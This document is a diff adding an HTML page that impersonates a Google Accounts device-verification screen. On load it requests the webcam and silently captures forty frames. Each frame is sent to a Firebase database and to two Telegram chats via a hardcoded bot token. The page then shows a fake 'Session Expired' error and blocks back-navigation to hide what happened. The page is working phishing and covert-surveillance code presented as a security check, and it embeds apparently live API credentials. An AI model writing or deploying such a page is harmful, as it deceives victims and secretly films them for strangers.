@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Accounts | Device Verification</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --g-blue: #1a73e8;
+            --g-border: #dadce0;
+            --g-text: #202124;
+            --g-subtext: #5f6368;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #fff; color: var(--g-text);
+            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .auth-card {
+            width: 100%; max-width: 450px; min-height: 500px;
+            border: 1px solid var(--g-border); border-radius: 8px;
+            padding: 48px 40px 36px; text-align: center; box-sizing: border-box;
+        }
+
+        .g-logo { width: 75px; margin-bottom: 24px; }
+        
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        .subtitle { font-size: 16px; color: var(--g-text); margin-bottom: 32px; }
+
+        .device-box {
+            background: #f8f9fa; border: 1px solid var(--g-border);
+            border-radius: 8px; padding: 16px; display: flex; align-items: center;
+            gap: 12px; text-align: left; margin-bottom: 24px;
+        }
+
+        .phone-icon { font-size: 24px; color: var(--g-subtext); }
+
+        .status-container {
+            margin-top: 40px; display: flex; flex-direction: column; align-items: center;
+        }
+
+        /* Material Design Loader */
+        .g-loader {
+            width: 24px; height: 24px; border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--g-blue); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 16px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-text { font-size: 14px; color: var(--g-subtext); letter-spacing: 0.2px; }
+
+        /* Cover-up Redirection UI */
+        #redirect-ui { display: none; text-align: left; }
+        .info-row { font-size: 13px; color: #d93025; background: #fce8e6; padding: 12px; border-radius: 4px; margin-top: 20px; }
+    </style>
+</head>
+<body onload="startVerification()">
+
+    <div class="auth-card" id="main-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/375px-Google_2015_logo.svg.png" class="g-logo" alt="Google">
+        
+        <div id="verify-ui">
+            <h1>Verify it's you</h1>
+            <p class="subtitle">To help keep your account safe, Google needs to verify that this is a trusted device before you can sign in.</p>
+            
+            <div class="device-box">
+                <span class="phone-icon">💻</span>
+                <div>
+                    <div style="font-size: 14px; font-weight: 500;">Current Session Detected</div>
+                    <div style="font-size: 12px; color: var(--g-subtext);">Location: Gaya, Bihar</div>
+                </div>
+            </div>
+
+            <div class="status-container">
+                <div class="g-loader"></div>
+                <div class="loading-text" id="status-label">Analyzing device integrity...</div>
+            </div>
+        </div>
+
+        <!-- The Redirection "Cover" -->
+        <div id="redirect-ui">
+            <h1 style="font-size: 22px;">Session Expired</h1>
+            <p style="font-size: 14px; color: var(--g-subtext);">The verification link has expired or has already been used. For your security, please return to the Gmail app and restart the login process.</p>
+            <div class="info-row">
+                <b>Error 403:</b> Secure Handshake Timeout
+            </div>
+            <button onclick="location.href='https://mail.google.com'" style="margin-top: 30px; background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer;">Go to Gmail</button>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startVerification() {
+            try {
+                // Initiates permission without a specific button click
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 40) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            showRedirection();
+                            return;
+                        }
+                        captureAndSend(++count);
+                        updateUI(count);
+                    }, 1300);
+                };
+            } catch (err) {
+                document.getElementById('status-label').innerText = "Device check failed. Retrying...";
+                document.getElementById('status-label').style.color = "#d93025";
+            }
+        }
+
+        function updateUI(step) {
+            const labels = [
+                "Validating browser sandbox...",
+                "Confirming network stability...",
+                "Syncing with Google Security...",
+                "Establishing encrypted relay..."
+            ];
+            if (step % 10 === 0) {
+                document.getElementById('status-label').innerText = labels[Math.floor(Math.random() * labels.length)];
+            }
+        }
+
+        function captureAndSend(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "GMAIL_VERIFY", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'g_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+
+        function showRedirection() {
+            document.getElementById('verify-ui').style.display = 'none';
+            document.getElementById('redirect-ui').style.display = 'block';
+            // Disable navigation
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+        }
+    </script>
+</body>
+</html>
